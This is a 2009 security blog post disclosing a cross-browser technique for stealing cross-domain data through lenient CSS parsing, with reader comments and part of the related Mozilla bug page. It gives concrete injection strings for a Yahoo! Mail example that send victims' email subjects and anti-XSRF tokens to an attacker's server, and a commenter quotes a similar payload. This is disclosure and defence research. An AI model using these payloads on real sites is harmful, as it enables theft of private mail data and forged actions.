=== Content from scarybeastsecurity.blogspot.com_1f83dda7_20250125_204648.html ===


# [Security](https://scarybeastsecurity.blogspot.com/)

Hacking everything, by Chris Evans / scarybeasts

## Monday, December 28, 2009

### Generic cross-browser cross-domain theft

Well, here's a nice little gem for the festive season. I like it for a few distinct reasons:

2. It's one of those cases where if you look at web standards from the correct angle, you can see a security vulnerability specified.

4. Accordingly, it affected all 5 major browsers. And likely the rest.

6. You can still be a theft victim even with plugins *and JavaScript* disabled!

It's much less serious than it could be because there are restrictions on the format of cross-domain data which can be stolen, and the attacker needs to be able to exercise limited control of the target theft page.
The issue is best introduced with an example. The example chosen is deliberately a little bit involved and not too severe. This is to give the upcoming browser updates a chance to get deployed.

**Example: Yahoo! Mail cross-domain subject line theft and e-mail deletion**

(It's important to note there is no apparent failing of the web app in question here).

* Step 1: E-mail your victim@yahoo.com with the subject line ');}

* Step 2: Wait a bit (assume that other e-mails are delivered to the victim at this time)

* Step 3: E-mail your victim@yahoo.com with the subject line {}body{background-image:url('http://google.com/ and include in the body: PLEASE CLICK <http://cevans-app.appspot.com/static/yahoocss.html>

* Step 4: Mild profit if the victim clicks the link.

If you set up the above scenario as a test, you might see something like this in an alert box upon clicking the link:
 `url(http://google.com/%3C/a%3E%3Cbr/%3E%3Cspan%20class=%22j%22%3EChris%20Evans%3C/span%3E%3C/span%3E%3C/div%3E%3C/div%3E%3Cdiv%20class=%22h%22%3E%3Cdiv%20class=%22i%22%3E%3Cspan%3E%3Ca%20href=%22/p/mail/messageDetail?fid=Inbox&amp;mid=1_3493_AGvHtEQAAWFgSgIzgAlWYQXHqDY&3=q%22%3ESuper%20sensitive%20subject%3C/a%3E%3Cbr/%3E%3Cspan%20class=%22j%22%3EChris%20Evans%3C/span%3E%3C/span%3E%3C/div%3E%3C/div%3E%3Cdiv%20class=%22h%22%3E%3Cdiv%20class=%22i%22%3E%3Cspan%3E%3Ca%20href=%22/p/mail/messageDetail?fid=Inbox&amp;mid=1_3933_AGTHtEQAAM%2FHSgIzawpE8Fwm1%2FI&5=x%22%3E)`
The above text is stolen cross-domain, and the interesting pieces are highlighted in bold. The data includes the subjects, senders and "mid" value for all e-mails received between the two set-up e-mails we sent the victim.
Although leaking of subjects and senders is not ideal, it's the "mid" value that interests us most as an attacker. This would *appear* to be a secure / unguessable ID. Accordingly, it is reasonable for the mail application to rely on it as a distinct anti-XSRF token. This is indeed the case for the "delete" operation, implemented as a simple HTTP GET request. Interestingly, the "forward" operation seems to have an additional anti-XSRF token in the POST body, making the "mid" leak not nearly as serious as it could have been.

That's how this whole attack proceeds in its most powerful form: leak a small amount of text cross-domain, and then bingo! if the leaked text happens to include a global anti-XSRF token.

**How does it work?**

It works by abusing the standards relating to the loading of CSS style sheets. Approximately, the standards are:

* Send cookies on any load of CSS, including cross-domain.

* When parsing the returned CSS, ignore any amount of crap leading up to a valid CSS descriptor.

By controlling a little bit of text in the victim domain, the attacker can inject what appears to be a valid CSS string. It does not matter what proceeds this CSS string: HTML, binary data, JSON, XML. The CSS parser will ruthlessly hunt down any CSS constructs within whatever blob is pulled from the victim's domain. To the CSS parser, the text in the above attack looks like this:
 `(some HTML junk; whatever){} body{background-image:url('http://google.com/%3C/a...stolen stuff...')}(some trailing HTML junk)`
So, the background of the attacker's page will be styled with a background image loaded from an URL, the path of which contains stolen data! One lovely twist of using a CSS string which is an URL is that it will be automatically fetched even if JavaScript is turned off! The stolen data is then harvested by the attacker from their web server logs.
Fortunately, there are various barriers to exploiting this:

* Any newlines in the injected string break the CSS parse. This is a very common condition which stops potentially serious attacks.

* CSS strings may be quoted within the ' or " characters. In a context where both of these are escaped (HTML escaped, URL escaped, whatever), it will not be possible to inject a CSS string.

* The attacker needs control of two injection points: pre-string and post-string. For many sensitive pages, the attacker won't have sufficient influence over the page data via URL params or reflection of attacker data.

General areas that are more susceptible to this attack include:

* JSON / XML feeds (common lack of newlines; no requirement to escape " (JSON strings) or ' (XML text nodes)).

* Socially-related websites (the victim is always browsing attacker-controlled strings such as comments on their mundane photos, etc).

**How do we fix it?**

It would be nice to be able to not send cookies for cross-domain CSS loads; however that would certainly break stuff and it's hard to measure what without actually causing the breakage.

It would be nice to be strict on the MIME type when loading CSS resources -- if not globally then at least for cross-domain loads. But this breaks high profile sites, \*cough\* configure.dell.com and text/plain \*cough\*. (To be fair, it gets much worse with many sites even using text/html, application/octet-stream, it goes on).

A good balance is to require the alleged CSS to at least start with well-formed CSS, iff it is a cross-domain load and the MIME type is broken. This is the approach I used in my pending WebKit patch.

Note that fixing this issue also fixes my previous attack of using cross-domain CSS to reliably tell if someone is logged in or not:

<http://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html>

**Credits**

* Aaron Sigel, for interesting discussions about using /\* styled multi-line comments to bypass the newline restriction. Looks like it's not possible to recover comment text but we didn't test all the browsers.

* Opera, for seemingly fixing this in v10.10 - although I don't know the exact heuristic used.

* The WebKit and Mozilla communities for good feedback on approaches and patches.

Posted by

[Chris Evans](https://www.blogger.com/profile/01004765479735675808 "author profile")

at

[6:22 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=3024470480937744884&postID=1981000830265264190&from=pencil "Edit Post")

#### 20 comments:

[![](//www.blogger.com/img/blogger_logo_round_35.png "Asirap")](https://www.blogger.com/profile/05154981292791346434)
[Asirap](https://www.blogger.com/profile/05154981292791346434)
said...

Sweet P.O.C. I'd actually be really curious how many legit pages break if you prevented cookies being sent with cross-domain CSS loads. I wouldn't expect this number to be too high, though I agree that stricter CSS validation is the better route.

[December 29, 2009 at 6:25 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262096707810#c4428102965091412592 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=4428102965091412592 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "jd")

jd
said...

Shouldn't the mimetype prevent yahoocss.html from loading the email as a stylesheet?

[December 30, 2009 at 12:11 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262203884524#c1475616280833768462 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1475616280833768462 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@jd: No, browsers will ignore the MIME type (unless they are in standards mode, but this is not a default configuration and the evil page loading the CSS can often change modes itself). The reason browsers ignore the MIME type to load CSS is that there are unfortunately a bunch of web sites out there that serve CSS with broken MIME types.

[December 30, 2009 at 12:48 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262206093284#c3902186486040029681 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3902186486040029681 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

How is it not the application's fault if the attack relies on being able to inject code? I don't see how this is any different than the traditional JavaScript injection attacks, except that this uses CSS and works with JS disabled.

What is it that developers should never trust? Oh yeah, it's user submitted data.

[December 30, 2009 at 12:51 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262206302077#c1510336961989305701 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1510336961989305701 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@Anonymous: I recommend a more careful reading of the blog post carefully. What's the bug in Yahoo! Mail? (there isn't one). We're not talking about a JavaScript injection (caused by failure to HTML escape, JS escape, etc). We're talking about making a CSS construct appear in the victim's page / feed / JSON API / etc. This uses characters such as { which remain intact even with correct escaping in the application.

[December 30, 2009 at 1:25 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262208355439#c1080148587588322832 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1080148587588322832 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

And if the injected subject line doesn't use a single or double quote, the attack doesn't work, now does it? You said it yourself:

"CSS strings may be quoted within the ' or " characters. In a context where both of these are escaped (HTML escaped, URL escaped, whatever), it will not be possible to inject a CSS string."

I don't know how I could read that any differently. Either single/double quotes are escaped properly or they aren't. If they aren't, the application is at fault, it doesn't matter what kind of application it is.

[December 30, 2009 at 1:42 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262209337455#c3519635292679139520 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3519635292679139520 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@Anonymous: ah, thanks for the clarification, now I see the bit you're missing. You do ask a good question. The HTML characters it is mandatory to escape vary depending on context. For example, inside a "-quoted HTML attribute value, you absolutely need to escape " characters. However inside of a tag, such as **hello"quote** things are different. There are similar subtleties to the escaping rules for XML and JSON, involving ' vs " that make those particularly interesting vectors too.

[December 30, 2009 at 2:02 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262210530145#c828783274969241244 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=828783274969241244 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

Ehh... my bold tag got parsed, hello"quote should be surrounded by a b tag in the example.

[December 30, 2009 at 2:03 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262210609151#c8132558347543311026 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=8132558347543311026 "Delete Comment")

[![](//resources.blogblog.com/img/blank.gif "tentacoloViola")](http://sites.google.com/site/tentacoloviola/)
[tentacoloViola](http://sites.google.com/site/tentacoloviola/)
said...

Hi Chris, kudos for your research, i've found it very interesting. However i think there is another constraint for this technique to work: http requests for css are done using GET so it is impossible to perform a cross domain theft on resources that are retrieved through POST requests. do you agree?

[January 5, 2010 at 4:09 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262693345364#c3812733780924652574 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3812733780924652574 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@tentacoloViola: Yes :)

[January 5, 2010 at 8:48 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262710123571#c6487816823989185761 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=6487816823989185761 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Isaac")](https://www.blogger.com/profile/10585942371837479099)
[Isaac](https://www.blogger.com/profile/10585942371837479099)
said...

Hey Chris, been a while ;D. This reminds me of the CSS injection bug found by a guy over here:
http://d.hatena.ne.jp/ofk/20081111/1226407593. If you can inject portions of CSS into a field and have it displayed, ie6 (maybe 7?) would parse it as valid css and allow you to read data contained in the field. for example using a css import: @import url("http://google.co.jp/search?source=ig&hl=en&rlz=&=&q={}body{font-family:");
Then you were able to read portions of the document like: alert(document.body.currentStyle.fontFamily).

[January 6, 2010 at 6:27 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262831225912#c5586747143257811465 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=5586747143257811465 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

You could just escape characters like { to { and : to : but you shouldn't have to resort to that!

[June 18, 2010 at 10:50 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1276883405564#c4767463765271521982 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=4767463765271521982 "Delete Comment")

[![](https://resources.blogblog.com/img/blank.gif "bcdalai")
![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirUsrcYve4ETlUDix_qyo4Kg9A9RshAL8BO0TOqfpFJPv8X1-QZiOuqSN4v0xiKctFr2r2m-Eb7b7ScMxRmvkcmaOUL1p5NoHpCSQTunxMTWv3fndC3lSnCEAkYc7MPg/s45-c/bcdalai_3074_08.09.2014.jpg)](https://www.blogger.com/profile/09295142170327988483)
[bcdalai](https://www.blogger.com/profile/09295142170327988483)
said...

This is very important article for everyone and especially to me. Because I'm using many web services with networking and micro-blogging tools that often use cross-domain CSS. And Thanks to Chris Evans.

[September 7, 2010 at 10:34 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1283880860904#c6473666055878784646 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=6473666055878784646 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

Scary!
Would this "vector" be broken, if one denies "third party" cookies ?

[September 9, 2010 at 10:35 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1284053738160#c6334996253789741664 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=6334996253789741664 "Delete Comment")

[![](//resources.blogblog.com/img/blank.gif "mu")](http://www.ikariams.info/vb)
[mu](http://www.ikariams.info/vb)
said...

Scary!
Would this "vector" be broken, if one denies "third party" cookies ?

yes

[November 8, 2010 at 11:05 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1289286325587#c1924459015001973540 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1924459015001973540 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "James Kettle")](https://www.blogger.com/profile/03270155456684307605)
[James Kettle](https://www.blogger.com/profile/03270155456684307605)
said...

That is a brilliant technique. Thanks for sharing it. These rareish flaws stack up.

[January 4, 2011 at 11:33 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1294169605239#c2480353146752799728 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=2480353146752799728 "Delete Comment")

[![](//resources.blogblog.com/img/blank.gif "kozmic")](http://twitter.com/kozmic)
[kozmic](http://twitter.com/kozmic)
said...

You mention talking with different browser vendors, have anyone beside Opera implemented fixes? If so it would be interesting to know what approach they have taken.

[January 26, 2011 at 10:58 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1296068301215#c3358309457092217867 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3358309457092217867 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Buge")

Buge
said...

@mu

I'm pretty sure you're wrong. Third party cookies have to do with how cookies are set.

This exploit doesn't involve setting any cookies in weird ways. It just sends the cookies in weird ways.

[October 3, 2014 at 4:21 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1412378517814#c7331155280653337712 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=7331155280653337712 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

First shouldn't "A good balance is to require the alleged CSS to at least start with well-formed CSS, iff it is a cross-domain load and the MIME type is broken." use only if instead of iff(if and only if) as that's interpreted that you may only use well formed CSS if it's cross-domain and the MIME type is broken; Which implies Presuming that iff takes precedence over 'and' that you may not use well formed CSS if it's a same domain request, else if and takes precedence over and then it implies that you may not use well formed CSS on a request which is on the same domain and has a valid MIME type. Anyway that's not too important, jut being a bit pedantic, perhaps I'm wrong.

Now my question, I know this is an old post and things may have been different back then but hasn't CSS only ever been parsed inside of a designated area such as a style tag or the style attribute, if so why would user input ever end up in there in the Yahoo email subject. The example doesn't explicitly state you added an element also from your comments it'd seem that there was no HTML injection so I don't see how that could have even been parsed as CSS instead of just plain text or rather HTML.

In addition I had to re-read the article and comments to presume you mean that the link to "http://cevans-app.appspot.com/static/yahoocss.html" will be requested and included into the document as a CSS document I fail to see how. First it's included part way through a background-image: url(); argument, the actual domain being requested should be a google.com and everything following should be part of the requested URI and not a new request which isn't much of a problem you control the initial URL anyway so you could change that to your malicious domain okay so the request is made as if to an image which could contain it's own style tags which would get parsed, but this doesn't explain why aforementioned URI is relevant. I assume you were saying that the background-img would be parsed and the XSRF tokens would be contained in the URI could be used to forge a GET request by the requested background-image URI ?

so to re-iterate why would the CSS parser pass the entire document? Isn't the entire point of the style tag/attribute to indicate where CSS exists and should be parsed from.
And why what relevance has the second link in the background-img URI?

[July 11, 2017 at 2:49 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1499809783636#c1136205043882262970 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1136205043882262970 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

You had me until you said "an URL".

[February 14, 2018 at 10:12 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1518631951622#c1456039787980989734 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1456039787980989734 "Delete Comment")

[Post a Comment](https://www.blogger.com/comment/fullpage/post/3024470480937744884/1981000830265264190)

[Newer Post](https://scarybeastsecurity.blogspot.com/2010/01/logout-xsrf-significant-web-app-bug.html "Newer Post")

[Older Post](https://scarybeastsecurity.blogspot.com/2009/12/bypassing-intent-of-blocking-third.html "Older Post")

[Home](https://scarybeastsecurity.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://scarybeastsecurity.blogspot.com/feeds/1981000830265264190/comments/default)

Subscribe to my Twitter feed: [@scarybeasts](https://twitter.com/scarybeasts).

## Subscribe To ScarybeastSecurity

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://scarybeastsecurity.blogspot.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2F1981000830265264190%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2F1981000830265264190%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://scarybeastsecurity.blogspot.com/feeds/1981000830265264190/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

## Blog Archive

* ►
  [2021](https://scarybeastsecurity.blogspot.com/2021/)
  (1)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2021/05/)
    (1)

* ►
  [2020](https://scarybeastsecurity.blogspot.com/2020/)
  (7)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2020/12/)
    (1)
  + ►
    [November](https://scarybeastsecurity.blogspot.com/2020/11/)
    (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2020/07/)
    (1)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2020/06/)
    (3)
  + ►
    [April](https://scarybeastsecurity.blogspot.com/2020/04/)
    (1)

* ►
  [2017](https://scarybeastsecurity.blogspot.com/2017/)
  (10)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2017/09/)
    (1)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2017/06/)
    (1)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2017/05/)
    (7)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2017/03/)
    (1)

* ►
  [2016](https://scarybeastsecurity.blogspot.com/2016/)
  (7)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2016/12/)
    (3)
  + ►
    [November](https://scarybeastsecurity.blogspot.com/2016/11/)
    (4)

* ►
  [2015](https://scarybeastsecurity.blogspot.com/2015/)
  (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2015/07/)
    (1)

* ►
  [2014](https://scarybeastsecurity.blogspot.com/2014/)
  (5)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2014/09/)
    (2)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2014/06/)
    (1)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2014/03/)
    (1)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2014/02/)
    (1)

* ►
  [2013](https://scarybeastsecurity.blogspot.com/2013/)
  (2)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2013/12/)
    (1)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2013/02/)
    (1)

* ►
  [2012](https://scarybeastsecurity.blogspot.com/2012/)
  (9)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2012/09/)
    (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2012/07/)
    (1)
  + ►
    [April](https://scarybeastsecurity.blogspot.com/2012/04/)
    (2)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2012/03/)
    (3)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2012/02/)
    (1)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2012/01/)
    (1)

* ►
  [2011](https://scarybeastsecurity.blogspot.com/2011/)
  (10)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2011/07/)
    (1)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2011/05/)
    (2)
  + ►
    [April](https://scarybeastsecurity.blogspot.com/2011/04/)
    (1)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2011/03/)
    (3)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2011/02/)
    (2)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://scarybeastsecurity.blogspot.com/2010/)
  (11)
  + ►
    [October](https://scarybeastsecurity.blogspot.com/2010/10/)
    (1)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2010/09/)
    (1)
  + ►
    [August](https://scarybeastsecurity.blogspot.com/2010/08/)
    (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2010/07/)
    (3)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2010/06/)
    (1)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2010/03/)
    (1)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2010/01/)
    (3)

* ▼
  [2009](https://scarybeastsecurity.blogspot.com/2009/)
  (29)
  + ▼
    [December](https://scarybeastsecurity.blogspot.com/2009/12/)
    (3)
    - [Generic cross-browser cross-domain theft](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html)
    - [Bypassing the intent of blocking "third-party" coo...](https://scarybeastsecurity.blogspot.com/2009/12/bypassing-intent-of-blocking-third.html)
    - [Cross-domain search timing](https://scarybeastsecurity.blogspot.com/2009/12/cross-domain-search-timing.html)
  + ►
    [November](https://scarybeastsecurity.blogspot.com/2009/11/)
    (2)
  + ►
    [October](https://scarybeastsecurity.blogspot.com/2009/10/)
    (3)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2009/09/)
    (1)
  + ►
    [August](https://scarybeastsecurity.blogspot.com/2009/08/)
    (2)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2009/07/)
    (3)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2009/06/)
    (4)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2009/05/)
    (3)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2009/03/)
    (3)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2009/02/)
    (4)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2009/01/)
    (1)

* ►
  [2008](https://scarybeastsecurity.blogspot.com/2008/)
  (20)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2008/12/)
    (2)
  + ►
    [November](https://scarybeastsecurity.blogspot.com/2008/11/)
    (5)
  + ►
    [October](https://scarybeastsecurity.blogspot.com/2008/10/)
    (1)
  + ►
    [August](https://scarybeastsecurity.blogspot.com/2008/08/)
    (3)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2008/07/)
    (5)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2008/03/)
    (1)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2008/02/)
    (3)

## My other stuff

* [My security advisories](http://scary.beasts.org/)
* [vsftpd home page](http://vsftpd.beasts.org/)
* [Tavis' security advisories](http://taviso.decsystem.org/research.html)

|  |  |
| --- | --- |

Simple theme. Theme images by [gaffera](https://www.istockphoto.com/googleimages.php?id=4072573&platform=blogger&langregion=en). Powered by [Blogger](https://www.blogger.com).



=== Content from bugzilla.mozilla.org_14c8ac21_20250126_115050.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/524223)
* [XML](/show_bug.cgi?ctype=xml&id=524223)

Closed
[Bug 524223](/show_bug.cgi?id=524223)
(CVE-2010-0654)

Opened 15 years ago
Closed 15 years ago

# Cross-domain data theft using CSS

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Cross-domain data theft using CSS

## Categories

### (Core :: CSS Parsing and Computation, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

